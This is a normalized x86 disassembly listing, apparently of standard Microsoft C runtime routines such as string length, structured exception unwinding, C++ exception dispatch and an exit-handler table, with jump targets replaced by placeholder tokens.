mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_4381f8
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_4381f8
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_4381f8
push [ esi + 0xc0 ]
call sub_4381f8
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_43c860
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_43c8eb
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_43c924
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_43c978
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43dace
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_43c9ae
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_437c1c
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_43dace
add esp 0x20
pop esi
pop ebp
retn
sub_43c9e1
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_43cab8
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_43ffe0
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_43cab8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_437c1c
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_43dace
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_43c9e1
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43c924
pop ebx
leave
retn
sub_43cb57
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_44a32e
call sub_44a32e
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_43cbca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_43ffe0
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_43ffe0
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_43cbf6
mov edi edi
push ebp
mov ebp esp
call sub_43ffe0
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_43cc1d
mov edi edi
push ebp
mov ebp esp
push esi
call sub_43ffe0
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_43ffe0
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_43ffe0
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_44a32e
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_43cc6f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_43c9ae
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_44b1f0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_43cccf
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_43cd02
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_43cd38
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_43cd91
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_44b23c
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_43de63
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_43de63
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_43ce47
mov edi edi
push esi
push 0x4
push 0x20
call sub_43de17
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_43ce78
push 0xc
push r--data
call sub_43f8e0
call sub_43b4c2
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_43cd91
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43ceae
mov eax [ ebp - 0x1c ]
call sub_43f925
retn
sub_43ced6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_437d2d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
pop ecx
sub_43cefd
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_43b970
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_43cf5c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_43ffe0
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_43ffe0
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_43ffe0
and [ eax + 0x90 ] 0x0
jmp sub_44a2e2
sub_43cfab
push 0x10
push r--data
call sub_43f8e0
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43d06d
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_43ffe0
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_43f925
retn
call sub_44a32e
call sub_44a32e
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_44b1f0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_43d087
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_43ffe0
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_43d0cc
push 0x8
push r--data
call sub_43f8e0
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_43f925
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_43c91d
mov [ ebp - 0x4 ] 0xfffffffe
sub_43d121
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_43d15b
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_44a32e
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_43cefd
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_43d21a
push 0x2c
push r--data
call sub_43f8e0
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_43cbca
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_43ffe0
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_43ffe0
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_43ffe0
mov [ eax + 0x88 ] esi
call sub_43ffe0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_43cc6f
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_43d340
mov eax [ ebp - 0x1c ]
call sub_43f925
retn
sub_43d2b3
mov esp [ ebp - 0x18 ]
call sub_43ffe0
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_43cfab
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_43d340
mov eax [ ebp - 0x1c ]
call sub_43f925
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_43d340
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_43cc1d
pop ecx
call sub_43ffe0
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_43ffe0
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_43cbf6
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_43d0cc
pop ecx
pop ecx
sub_43d3b6
push 0xc
push r--data
call sub_43f8e0
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_44b26f
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_44b26f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_44a32e
push ebx
push esi
call sub_44b26f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_44b26f
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_44b26f
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_44b26f
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_44b26f
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_44b26f
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_437db0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_44b26f
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_43d121
pop ecx
pop ecx
push eax
push esi
call sub_437db0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_43f925
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_43d121
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_43d535
push 0x8
push r--data
call sub_43f8e0
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_43d121
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_43c91d
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_43d3b6
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43f925
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_43d121
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_43c91d
jmp r-xdata
sub_43d5c7
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_43d535
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_43c8eb
call sub_43c924
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_43cfab
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_43d21a
add esp 0x28
test eax eax
je r-xdata
sub_43d635
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_43ffe0
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_43ffe0
lea edi [ eax + 0x80 ]
call sub_43fe30
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_43cb57
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_44a32e
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43c9e1
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_43d5c7
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_43d73c
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_44a32e
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_43ffe0
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_44a32e
